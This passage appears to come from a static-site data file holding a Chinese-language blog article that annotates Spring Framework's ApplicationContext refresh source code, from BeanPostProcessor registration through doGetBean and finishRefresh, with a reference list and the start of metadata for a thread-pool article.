   // 6.2 将ppname对应的beanpostprocessor实例对象添加到orderedpostprocessors, 准备执行注册\n \n        orderedpostprocessors.add(pp);\n \n        if (pp instanceof mergedbeandefinitionpostprocessor) {\n \n            // 6.3 如果ppname对应的bean实例也实现了mergedbeandefinitionpostprocessor接口,\n \n            // 则将ppname对应的bean实例添加到internalpostprocessors\n \n            internalpostprocessors.add(pp);\n \n        }\n \n    }\n \n    // 6.4 对orderedpostprocessors进行排序\n \n    sortpostprocessors(orderedpostprocessors, beanfactory);\n \n    // 6.5 注册orderedpostprocessors\n \n    registerbeanpostprocessors(beanfactory, orderedpostprocessors);\n \n \n \n    // now, register all regular beanpostprocessors.\n \n    // 7.注册所有常规的beanpostprocessors（过程与6类似）\n \n    list<beanpostprocessor> nonorderedpostprocessors = new arraylist<beanpostprocessor>();\n \n    for (string ppname : nonorderedpostprocessornames) {\n \n        beanpostprocessor pp = beanfactory.getbean(ppname, beanpostprocessor.class);\n \n        nonorderedpostprocessors.add(pp);\n \n        if (pp instanceof mergedbeandefinitionpostprocessor) {\n \n            internalpostprocessors.add(pp);\n \n        }\n \n    }\n \n    registerbeanpostprocessors(beanfactory, nonorderedpostprocessors);\n \n \n \n    // finally, re-register all internal beanpostprocessors.\n \n    // 8.最后, 重新注册所有内部beanpostprocessors（相当于内部的beanpostprocessor会被移到处理器链的末尾）\n \n    // 8.1 对internalpostprocessors进行排序\n \n    sortpostprocessors(internalpostprocessors, beanfactory);\n \n    // 8.2注册internalpostprocessors\n \n    registerbeanpostprocessors(beanfactory, internalpostprocessors);\n \n \n \n    // re-register post-processor for detecting inner beans as applicationlisteners,\n \n    // moving it to the end of the processor chain (for picking up proxies etc).\n \n    // 9.重新注册applicationlistenerdetector（跟8类似，主要是为了移动到处理器链的末尾）\n \n    beanfactory.addbeanpostprocessor(new applicationlistenerdetector(applicationcontext));\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n\n\n使用：可以在bean的初始化前后添加自己想要的代码\n\n \npublic static void registerbeanpostprocessors(\n        configurablelistablebeanfactory beanfactory, abstractapplicationcontext applicationcontext) {\n \n \n \n    // 1.找出所有实现beanpostprocessor接口的类\n \n    string[] postprocessornames = beanfactory.getbeannamesfortype(beanpostprocessor.class, true, false);\n \n \n \n    // register beanpostprocessorchecker that logs an info message when\n \n    // a bean is created during beanpostprocessor instantiation, i.e. when\n \n    // a bean is not eligible for getting processed by all beanpostprocessors.\n \n    // beanpostprocessor的目标计数\n \n    int beanprocessortargetcount = beanfactory.getbeanpostprocessorcount() + 1 + postprocessornames.length;\n \n    // 2.添加beanpostprocessorchecker(主要用于记录信息)到beanfactory中\n \n    beanfactory.addbeanpostprocessor(new beanpostprocessorchecker(beanfactory, beanprocessortargetcount));\n \n \n \n    // separate between beanpostprocessors that implement priorityordered,\n \n    // ordered, and the rest.\n \n    // 3.定义不同的变量用于区分: 实现priorityordered接口的beanpostprocessor、实现ordered接口的beanpostprocessor、普通beanpostprocessor\n \n    // 3.1 priorityorderedpostprocessors: 用于存放实现priorityordered接口的beanpostprocessor\n \n    list<beanpostprocessor> priorityorderedpostprocessors = new arraylist<beanpostprocessor>();\n \n    // 3.2 internalpostprocessors: 用于存放spring内部的beanpostprocessor\n \n    list<beanpostprocessor> internalpostprocessors = new arraylist<beanpostprocessor>();\n \n    // 3.3 orderedpostprocessornames: 用于存放实现ordered接口的beanpostprocessor的beanname\n \n    list<string> orderedpostprocessornames = new arraylist<string>();\n \n    // 3.4 nonorderedpostprocessornames: 用于存放普通beanpostprocessor的beanname\n \n    list<string> nonorderedpostprocessornames = new arraylist<string>();\n \n    // 4.遍历postprocessornames, 将beanpostprocessors按3.1 - 3.4定义的变量区分开\n \n    for (string ppname : postprocessornames) {\n \n        if (beanfactory.istypematch(ppname, priorityordered.class)) {\n \n            // 4.1 如果ppname对应的bean实例实现了priorityordered接口, 则拿到ppname对应的bean实例并添加到priorityorderedpostprocessors\n \n            beanpostprocessor pp = beanfactory.getbean(ppname, beanpostprocessor.class);\n \n            priorityorderedpostprocessors.add(pp);\n \n            if (pp instanceof mergedbeandefinitionpostprocessor) {\n \n                // 4.2 如果ppname对应的bean实例也实现了mergedbeandefinitionpostprocessor接口,\n \n                // 则将ppname对应的bean实例添加到internalpostprocessors\n \n                internalpostprocessors.add(pp);\n \n            }\n \n        }\n \n        else if (beanfactory.istypematch(ppname, ordered.class)) {\n \n            // 4.3 如果ppname对应的bean实例没有实现priorityordered接口, 但是实现了ordered接口, 则将ppname添加到orderedpostprocessornames\n \n            orderedpostprocessornames.add(ppname);\n \n        }\n \n        else {\n \n            // 4.4 否则, 将ppname添加到nonorderedpostprocessornames\n \n            nonorderedpostprocessornames.add(ppname);\n \n        }\n \n    }\n \n \n \n    // first, register the beanpostprocessors that implement priorityordered.\n \n    // 5.首先, 注册实现priorityordered接口的beanpostprocessors\n \n    // 5.1 对priorityorderedpostprocessors进行排序\n \n    sortpostprocessors(priorityorderedpostprocessors, beanfactory);\n \n    // 5.2 注册priorityorderedpostprocessors\n \n    registerbeanpostprocessors(beanfactory, priorityorderedpostprocessors);\n \n \n \n    // next, register the beanpostprocessors that implement ordered.\n \n    // 6.接下来, 注册实现ordered接口的beanpostprocessors\n \n    list<beanpostprocessor> orderedpostprocessors = new arraylist<beanpostprocessor>();\n \n    for (string ppname : orderedpostprocessornames) {\n \n        // 6.1 拿到ppname对应的beanpostprocessor实例对象\n \n        beanpostprocessor pp = beanfactory.getbean(ppname, beanpostprocessor.class);\n \n        // 6.2 将ppname对应的beanpostprocessor实例对象添加到orderedpostprocessors, 准备执行注册\n \n        orderedpostprocessors.add(pp);\n \n        if (pp instanceof mergedbeandefinitionpostprocessor) {\n \n            // 6.3 如果ppname对应的bean实例也实现了mergedbeandefinitionpostprocessor接口,\n \n            // 则将ppname对应的bean实例添加到internalpostprocessors\n \n            internalpostprocessors.add(pp);\n \n        }\n \n    }\n \n    // 6.4 对orderedpostprocessors进行排序\n \n    sortpostprocessors(orderedpostprocessors, beanfactory);\n \n    // 6.5 注册orderedpostprocessors\n \n    registerbeanpostprocessors(beanfactory, orderedpostprocessors);\n \n \n \n    // now, register all regular beanpostprocessors.\n \n    // 7.注册所有常规的beanpostprocessors（过程与6类似）\n \n    list<beanpostprocessor> nonorderedpostprocessors = new arraylist<beanpostprocessor>();\n \n    for (string ppname : nonorderedpostprocessornames) {\n \n        beanpostprocessor pp = beanfactory.getbean(ppname, beanpostprocessor.class);\n \n        nonorderedpostprocessors.add(pp);\n \n        if (pp instanceof mergedbeandefinitionpostprocessor) {\n \n            internalpostprocessors.add(pp);\n \n        }\n \n    }\n \n    registerbeanpostprocessors(beanfactory, nonorderedpostprocessors);\n \n \n \n    // finally, re-register all internal beanpostprocessors.\n \n    // 8.最后, 重新注册所有内部beanpostprocessors（相当于内部的beanpostprocessor会被移到处理器链的末尾）\n \n    // 8.1 对internalpostprocessors进行排序\n \n    sortpostprocessors(internalpostprocessors, beanfactory);\n \n    // 8.2注册internalpostprocessors\n \n    registerbeanpostprocessors(beanfactory, internalpostprocessors);\n \n \n \n    // re-register post-processor for detecting inner beans as applicationlisteners,\n \n    // moving it to the end of the processor chain (for picking up proxies etc).\n \n    // 9.重新注册applicationlistenerdetector（跟8类似，主要是为了移动到处理器链的末尾）\n \n    beanfactory.addbeanpostprocessor(new applicationlistenerdetector(applicationcontext));\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n\n\n\n# 5.9 initmessagesource()\n\n/**\n* initialize the messagesource.\n* use parent\'s if none defined in this context.\n*/\nprotected void initmessagesource() {\n   //获取bean工厂，一般是defaultlistbeanfactory\n   configurablelistablebeanfactory beanfactory = getbeanfactory();\n   //首先判断是否已有xml文件定义了id为messagesource的bean对象\n   if (beanfactory.containslocalbean(message_source_bean_name)) {\n      //如果有，则从bean工厂得到这个bean对象\n      this.messagesource = beanfactory.getbean(message_source_bean_name, messagesource.class);\n      // make messagesource aware of parent messagesource.\n      //当父类bean工厂不为空，并且这个bean对象是hierarchicalmessagesource类型\n      if (this.parent != null && this.messagesource instanceof hierarchicalmessagesource) {\n         //为hierarchicalmessagesource的实现类\n         hierarchicalmessagesource hms = (hierarchicalmessagesource) this.messagesource;\n         //设置父类messagesource，此处设置内部的parent messagesource\n         if (hms.getparentmessagesource() == null) {\n            // only set parent context as parent messagesource if no parent messagesource\n            // registered already.\n            hms.setparentmessagesource(getinternalparentmessagesource());\n         }\n      }\n      if (logger.istraceenabled()) {\n         logger.trace("using messagesource [" + this.messagesource + "]");\n      }\n   }\n   else {\n      // use empty messagesource to be able to accept getmessage calls.\n      //如果没有xml文件定义信息源对象，新建delegatingmessagesource类作为messagesource的bean\n      //因为delegatingmessagesource类实现了hierarchicalmessagesource接口，而这个接口继承了messagesource这个类\n      //因此实现了这个接口的类，都是messagesource的子类，因此delegatingmessagesource也是一个messagesource\n      delegatingmessagesource dms = new delegatingmessagesource();\n      //给这个delegatingmessagesource添加父类消息源\n      dms.setparentmessagesource(getinternalparentmessagesource());\n      this.messagesource = dms;\n      //将这个messagesource实例注册到bean工厂中\n      beanfactory.registersingleton(message_source_bean_name, this.messagesource);\n      if (logger.istraceenabled()) {\n         logger.trace("no \'" + message_source_bean_name + "\' bean, using [" + this.messagesource + "]");\n      }\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 5.10 initapplicationeventmulticaster()\n\n代码很简单，就是分两种情况进行初始化的过程\n\nprotected void initapplicationeventmulticaster() {\n    configurablelistablebeanfactory beanfactory = getbeanfactory();\n    if (beanfactory.containslocalbean(application_event_multicaster_bean_name)) {\n        this.applicationeventmulticaster =\n            beanfactory.getbean(application_event_multicaster_bean_name, applicationeventmulticaster.class);\n        if (logger.istraceenabled()) {\n            logger.trace("using applicationeventmulticaster [" + this.applicationeventmulticaster + "]");\n        }\n    }\n    else {\n        this.applicationeventmulticaster = new simpleapplicationeventmulticaster(beanfactory);\n        beanfactory.registersingleton(application_event_multicaster_bean_name, this.applicationeventmulticaster);\n        if (logger.istraceenabled()) {\n            logger.trace("no \'" + application_event_multicaster_bean_name + "\' bean, using " +\n                         "[" + this.applicationeventmulticaster.getclass().getsimplename() + "]");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 5.11 onrefresh()\n\n这个方法是空的没有进行实现，官网给的注释是\n\ninitialize other special beans in specific context subclasses.\n\n初始化一些其他的特殊的bean\n\n\n# 5.12 registerlisteners()\n\n获取applicationcontext初始化的listeners，然后添加到eventmulticaster，这个刚才初始化的\n\n这里面的earlyapplicationevents是在第一步的时候进行初始化的\n\n在preparerefresh方法中的\n\nthis.earlyapplicationevents = new linkedhashset<>();\n\n\tprotected void registerlisteners() {\n\t\t// register statically specified listeners first.\n\t\tfor (applicationlistener<?> listener : getapplicationlisteners()) {\n\t\t\tgetapplicationeventmulticaster().addapplicationlistener(listener);\n\t\t}\n \n\t\t// do not initialize factorybeans here: we need to leave all regular beans\n\t\t// uninitialized to let post-processors apply to them!\n\t\tstring[] listenerbeannames = getbeannamesfortype(applicationlistener.class, true, false);\n\t\tfor (string listenerbeanname : listenerbeannames) {\n\t\t\tgetapplicationeventmulticaster().addapplicationlistenerbean(listenerbeanname);\n\t\t}\n \n\t\t// publish early application events now that we finally have a multicaster...\n\t\tset<applicationevent> earlyeventstoprocess = this.earlyapplicationevents;\n\t\tthis.earlyapplicationevents = null;\n\t\tif (earlyeventstoprocess != null) {\n\t\t\tfor (applicationevent earlyevent : earlyeventstoprocess) {\n\t\t\t\tgetapplicationeventmulticaster().multicastevent(earlyevent);\n\t\t\t}\n\t\t}\n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n自定义监听器的实现\n\nimport org.springframework.context.applicationlistener;\nimport org.springframework.context.event.contextrefreshedevent;\nimport org.springframework.stereotype.component;\n@component\npublic class myrefreshedlistener implements applicationlistener<contextrefreshedevent> {\n    @override\n    public void onapplicationevent(contextrefreshedevent event) {\n        // 自己的逻辑处理\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 5.13 核心方法之一 finishbeanfactoryinitialization(beanfactory)\n\nprotected void finishbeanfactoryinitialization(configurablelistablebeanfactory beanfactory) {\n    // initialize conversion service for this context.\n    if (beanfactory.containsbean(conversion_service_bean_name) &&\n    beanfactory.istypematch(conversion_service_bean_name, conversionservice.class)) {\n    beanfactory.setconversionservice(\n    beanfactory.getbean(conversion_service_bean_name, conversionservice.class));\n    }\n\n    // register a default embedded value resolver if no bean post-processor\n    // (such as a propertyplaceholderconfigurer bean) registered any before:\n    // at this point, primarily for resolution in annotation attribute values.\n    if (!beanfactory.hasembeddedvalueresolver()) {\n    beanfactory.addembeddedvalueresolver(strval -> getenvironment().resolveplaceholders(strval));\n    }\n\n    // initialize loadtimeweaveraware beans early to allow for registering their transformers early.\n    string[] weaverawarenames = beanfactory.getbeannamesfortype(loadtimeweaveraware.class, false, false);\n    for (string weaverawarename : weaverawarenames) {\n    getbean(weaverawarename);\n    }\n\n    // stop using the temporary classloader for type matching.\n    beanfactory.settempclassloader(null);\n\n    // allow for caching all bean definition metadata, not expecting further changes.\n    beanfactory.freezeconfiguration();\n\n    // instantiate all remaining (non-lazy-init) singletons.\n    beanfactory.preinstantiatesingletons();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n关键起作用的在最后一行beanfactory.preinstantiatesingletons();我们进入\n\n这个时候发现又进入了我们的老朋友\n\ndefaultlistablebeanfactory这个重要的类\n\n这里里面的关键代码在于通过名字获取bean，也就是getbean(beanname);方法\n\npublic void preinstantiatesingletons() throws beansexception {\n    if (logger.istraceenabled()) {\n    \tlogger.trace("pre-instantiating singletons in " + this);\n    }\n    \n    // iterate over a copy to allow for init methods which in turn register new bean definitions.\n\t// while this may not be part of the regular factory bootstrap, it does otherwise work fine.\n\tlist<string> beannames = new arraylist<>(this.beandefinitionnames);\n \n\t// trigger initialization of all non-lazy singleton beans...\n\tfor (string beanname : beannames) {\n\t\trootbeandefinition bd = getmergedlocalbeandefinition(beanname);\n\t\tif (!bd.isabstract() && bd.issingleton() && !bd.islazyinit()) {\n\t\t\tif (isfactorybean(beanname)) {\n\t\t\t\tobject bean = getbean(factory_bean_prefix + beanname);\n\t\t\t\tif (bean instanceof factorybean) {\n\t\t\t\t\tfinal factorybean<?> factory = (factorybean<?>) bean;\n\t\t\t\t\tboolean iseagerinit;\n\t\t\t\t\tif (system.getsecuritymanager() != null && factory instanceof smartfactorybean) {\n\t\t\t\t\t\tiseagerinit = accesscontroller.doprivileged((privilegedaction<boolean>)\n\t\t\t\t\t\t\t\t\t\t((smartfactorybean<?>) factory)::iseagerinit,\n\t\t\t\t\t\t\t\tgetaccesscontrolcontext());\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tiseagerinit = (factory instanceof smartfactorybean &&\n\t\t\t\t\t\t\t\t((smartfactorybean<?>) factory).iseagerinit());\n\t\t\t\t\t}\n\t\t\t\t\tif (iseagerinit) {\n\t\t\t\t\t\tgetbean(beanname);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tgetbean(beanname);\n\t\t\t}\n\t\t}\n\t}\n \n\t// trigger post-initialization callback for all applicable beans...\n\tfor (string beanname : beannames) {\n\t\tobject singletoninstance = getsingleton(beanname);\n\t\tif (singletoninstance instanceof smartinitializingsingleton) {\n\t\t\tfinal smartinitializingsingleton smartsingleton = (smartinitializingsingleton) singletoninstance;\n\t\t\tif (system.getsecuritymanager() != null) {\n\t\t\t\taccesscontroller.doprivileged((privilegedaction<object>) () -> {\n\t\t\t\t\tsmartsingleton.aftersingletonsinstantiated();\n\t\t\t\t\treturn null;\n\t\t\t\t}, getaccesscontrolcontext());\n\t\t\t}\n\t\t\telse {\n\t\t\t\tsmartsingleton.aftersingletonsinstantiated();\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n我们进入getbean(beanname);方法\n\npublic object getbean(string name) throws beansexception {\n\t\treturn dogetbean(name, null, null, false);\n}\n\n\n1\n2\n3\n\n\n发现仅仅是调用了dogetbean这个方法，但是我们在这里看到了do，在spring中do都是干实事的地方，那我们就要知道，创建bean的重点来了。\n\nprotected <t> t dogetbean(final string name, @nullable final class<t> requiredtype,\n    \t@nullable final object[] args, boolean typecheckonly) throws beansexception {\n    \t\n    final string beanname = transformedbeanname(name);\n\tobject bean;\n \n\t// eagerly check singleton cache for manually registered singletons.\n            //这部分是通过getsingleton(beanname)方法去singleton缓存中找bean实例，\n            //应该是拿不到的，因为我们是第一次初始化，缓存中肯定不存在。\n\tobject sharedinstance = getsingleton(beanname);\n\tif (sharedinstance != null && args == null) {\n\t\tif (logger.istraceenabled()) {\n\t\t\tif (issingletoncurrentlyincreation(beanname)) {\n\t\t\t\tlogger.trace("returning eagerly cached instance of singleton bean \'" + beanname +\n\t\t\t\t\t\t"\' that is not fully initialized yet - a consequence of a circular reference");\n\t\t\t}\n\t\t\telse {\n\t\t\t\tlogger.trace("returning cached instance of singleton bean \'" + beanname + "\'");\n\t\t\t}\n\t\t}\n\t\tbean = getobjectforbeaninstance(sharedinstance, name, beanname, null);\n\t}\n \n\telse {\n\t\t// fail if we\'re already creating this bean instance:\n\t\t// we\'re assumably within a circular reference.\n                    //这段是根据当前的beanfactory获取父一级的beanfactory，然后逐级递归的查找我们需要的bean\n\t\tif (isprototypecurrentlyincreation(beanname)) {\n\t\t\tthrow new beancurrentlyincreationexception(beanname);\n\t\t}\n \n\t\t// check if bean definition exists in this factory.\n\t\tbeanfactory parentbeanfactory = getparentbeanfactory();\n\t\tif (parentbeanfactory != null && !containsbeandefinition(beanname)) {\n\t\t\t// not found -> check parent.\n\t\t\tstring nametolookup = originalbeanname(name);\n\t\t\tif (parentbeanfactory instanceof abstractbeanfactory) {\n\t\t\t\treturn ((abstractbeanfactory) parentbeanfactory).dogetbean(\n\t\t\t\t\t\tnametolookup, requiredtype, args, typecheckonly);\n\t\t\t}\n\t\t\telse if (args != null) {\n\t\t\t\t// delegation to parent with explicit args.\n\t\t\t\treturn (t) parentbeanfactory.getbean(nametolookup, args);\n\t\t\t}\n\t\t\telse if (requiredtype != null) {\n\t\t\t\t// no args -> delegate to standard getbean method.\n\t\t\t\treturn parentbeanfactory.getbean(nametolookup, requiredtype);\n\t\t\t}\n\t\t\telse {\n\t\t\t\treturn (t) parentbeanfactory.getbean(nametolookup);\n\t\t\t}\n\t\t}\n        //第三部分先判断并把需要创建的bean打上正在创建标记，\n        //也就是开头的if判断加markbeanascreated(beanname)方法\n        //（这样做的目的是在我创建这个bean之前就先打上创建标记，告诉其它来创建的线程，避免了重复创建，那么这个方法内部肯定是同步的）\n\t\tif (!typecheckonly) {\n\t\t\tmarkbeanascreated(beanname);\n\t\t}\n \n\t\ttry {\n\t\t\tfinal rootbeandefinition mbd = getmergedlocalbeandefinition(beanname);\n\t\t\tcheckmergedbeandefinition(mbd, beanname, args);\n \n\t\t\t// guarantee initialization of beans that the current bean depends on.\n\t\t\tstring[] dependson = mbd.getdependson();\n\t\t\tif (dependson != null) {\n\t\t\t\tfor (string dep : dependson) {\n\t\t\t\t\tif (isdependent(beanname, dep)) {\n\t\t\t\t\t\tthrow new beancreationexception(mbd.getresourcedescription(), beanname,\n\t\t\t\t\t\t\t\t"circular depends-on relationship between \'" + beanname + "\' and \'" + dep + "\'");\n\t\t\t\t\t}\n\t\t\t\t\tregisterdependentbean(dep, beanname);\n\t\t\t\t\ttry {\n\t\t\t\t\t\tgetbean(dep);\n\t\t\t\t\t}\n\t\t\t\t\tcatch (nosuchbeandefinitionexception ex) {\n\t\t\t\t\t\tthrow new beancreationexception(mbd.getresourcedescription(), beanname,\n\t\t\t\t\t\t\t\t"\'" + beanname + "\' depends on missing bean \'" + dep + "\'", ex);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n \n\t\t\t// create bean instance.\n\t\t\tif (mbd.issingleton()) {\n\t\t\t\tsharedinstance = getsingleton(beanname, () -> {\n\t\t\t\t\ttry {\n\t\t\t\t\t\treturn createbean(beanname, mbd, args);\n\t\t\t\t\t}\n\t\t\t\t\tcatch (beansexception ex) {\n\t\t\t\t\t\t// explicitly remove instance from singleton cache: it might have been put there\n\t\t\t\t\t\t// eagerly by the creation process, to allow for circular reference resolution.\n\t\t\t\t\t\t// also remove any beans that received a temporary reference to the bean.\n\t\t\t\t\t\tdestroysingleton(beanname);\n\t\t\t\t\t\tthrow ex;\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t\tbean = getobjectforbeaninstance(sharedinstance, name, beanname, mbd);\n\t\t\t}\n \n\t\t\telse if (mbd.isprototype()) {\n\t\t\t\t// it\'s a prototype -> create a new instance.\n\t\t\t\tobject prototypeinstance = null;\n\t\t\t\ttry {\n\t\t\t\t\tbeforeprototypecreation(beanname);\n\t\t\t\t\tprototypeinstance = createbean(beanname, mbd, args);\n\t\t\t\t}\n\t\t\t\tfinally {\n\t\t\t\t\tafterprototypecreation(beanname);\n\t\t\t\t}\n\t\t\t\tbean = getobjectforbeaninstance(prototypeinstance, name, beanname, mbd);\n\t\t\t}\n \n\t\t\telse {\n\t\t\t\tstring scopename = mbd.getscope();\n\t\t\t\tfinal scope scope = this.scopes.get(scopename);\n\t\t\t\tif (scope == null) {\n\t\t\t\t\tthrow new illegalstateexception("no scope registered for scope name \'" + scopename + "\'");\n\t\t\t\t}\n\t\t\t\ttry {\n\t\t\t\t\tobject scopedinstance = scope.get(beanname, () -> {\n\t\t\t\t\t\tbeforeprototypecreation(beanname);\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\treturn createbean(beanname, mbd, args);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tfinally {\n\t\t\t\t\t\t\tafterprototypecreation(beanname);\n\t\t\t\t\t\t}\n\t\t\t\t\t});\n\t\t\t\t\tbean = getobjectforbeaninstance(scopedinstance, name, beanname, mbd);\n\t\t\t\t}\n\t\t\t\tcatch (illegalstateexception ex) {\n\t\t\t\t\tthrow new beancreationexception(beanname,\n\t\t\t\t\t\t\t"scope \'" + scopename + "\' is not active for the current thread; consider " +\n\t\t\t\t\t\t\t"defining a scoped proxy for this bean if you intend to refer to it from a singleton",\n\t\t\t\t\t\t\tex);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcatch (beansexception ex) {\n\t\t\tcleanupafterbeancreationfailure(beanname);\n\t\t\tthrow ex;\n\t\t}\n\t}\n \n\t// check if required type matches the type of the actual bean instance.\n\tif (requiredtype != null && !requiredtype.isinstance(bean)) {\n\t\ttry {\n\t\t\tt convertedbean = gettypeconverter().convertifnecessary(bean, requiredtype);\n\t\t\tif (convertedbean == null) {\n\t\t\t\tthrow new beannotofrequiredtypeexception(name, requiredtype, bean.getclass());\n\t\t\t}\n\t\t\treturn convertedbean;\n\t\t}\n\t\tcatch (typemismatchexception ex) {\n\t\t\tif (logger.istraceenabled()) {\n\t\t\t\tlogger.trace("failed to convert bean \'" + name + "\' to required type \'" +\n\t\t\t\t\t\tclassutils.getqualifiedname(requiredtype) + "\'", ex);\n\t\t\t}\n\t\t\tthrow new beannotofrequiredtypeexception(name, requiredtype, bean.getclass());\n\t\t}\n\t}\n\treturn (t) bean;\n}\n\n\n不知道小伙伴能否在这里体会到反射的思想呢\n\n\n# 5.14 finishrefresh()\n\n最后进行一些收尾工作\n\nprotected void finishrefresh() {\n\t// clear context-level resource caches (such as asm metadata from scanning).\n\tclearresourcecaches();\n \n\t// initialize lifecycle processor for this context.\n\tinitlifecycleprocessor();\n \n\t// propagate refresh to lifecycle processor first.\n\tgetlifecycleprocessor().onrefresh();\n \n\t// publish the final event.\n\tpublishevent(new contextrefreshedevent(this));\n \n\t// participate in livebeansview mbean, if active.\n\tlivebeansview.registerapplicationcontext(this);\n}\n\n\n\n# 总结\n\n\n# 源码分析中比较重要的类有\n\napplicationcontet（主要的容器，串联流程）\n\nenvironment（可以判断环境的有效性）\n\nbeanpostprocessor（用于bean实例化前后的扩展）\n\nbeanfactory（最顶层的一个接口）\n\nfactorybean（也是用来更好的扩展，他也就有三个方法）\n\nbeanfactorypostporcessor（用来工厂后来的扩展）\n\nbeandefinitionreader（读取前面的一些信息）\n\nclasspathxmlapplicationcontext（读取总的配置文件）\n\ncontextloaderlistener与它的父类contextloader（spring的入口）\n\n\n# 参考\n\n1.https://blog.csdn.net/spring_live_in/article/details/101059038\n\n2.https://blog.csdn.net/sinat_38259539/article/details/71799078?utm_medium=distribute.pc_relevant.none-task-blog-blogcommendfrombaidu-4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-blogcommendfrombaidu-4\n\n3.https://liteyu.blog.csdn.net/article/details/105754312\n\n4.https://blog.csdn.net/v123411739/article/details/87741251',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"线程池 - 进阶",frontmatter:{title:"线程池 - 进阶",date:"2020-03-03T00:00:00.000Z",tags:["多线程","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/ThreadPool.html",relativePath:"views/backend/ThreadPool.md",key:"v-48e2cf88",path:"/views/backend/ThreadPool.html",headers:[{level:2,title:"前言",slug:"前言",normalizedTitle:"前言",charIndex:3},{level:2,title:"初识Executors",slug:"初识executors",normalizedTitle:"初识executors",charIndex:9},{level:2,title:"步入ThreadPoolExecutor",slug:"步入threadpoolexecutor",normalizedTitle:"步入threadpoolexecutor",charIndex:24},{level:3,title:"handler拒绝策略",slug:"handler拒绝策略",normalizedTitle:"handler拒绝策略",charIndex:50},{level:3,title:"workQueue任务队列",slug:"workqueue任务队列",normalizedTitle:"workqueue任务队列",charIndex:67},{level:2,title:"线程池的工作顺序",slug:"线程池的工作顺序",normalizedTitle:"线程池的工作顺序",charIndex:84},{level:2,title:"Executors弊端",slug:"executors弊端",normalizedTitle:"executors弊端",charIndex:96},{level:2,title:"正确的使用线程池",slug:"正确的使用线程池",normalizedTitle:"正确的使用线程池",charIndex:111},{level:3,title:"线程超时时间",slug:"线程超时时间",normalizedTitle:"线程超时时间",charIndex:125}],headersStr:"前言 初识Executors 步入ThreadPoolExecutor handler拒绝策略 workQueue任务队列 线程池的工作顺序 Executors弊端 正确的使用线程池 线程超时时间",content:' * 前言\n * 初识Executors\n * 步入ThreadPoolExecutor\n   * handler拒绝策略\n   * workQueue任务队列\n * 线程池的工作顺序\n * Executors弊端\n * 正确的使用线程池\n   * 线程超时时间\n\n\n\n\n# 前言\n\n * Java中创建线程池很简单，Java提供了 Executors 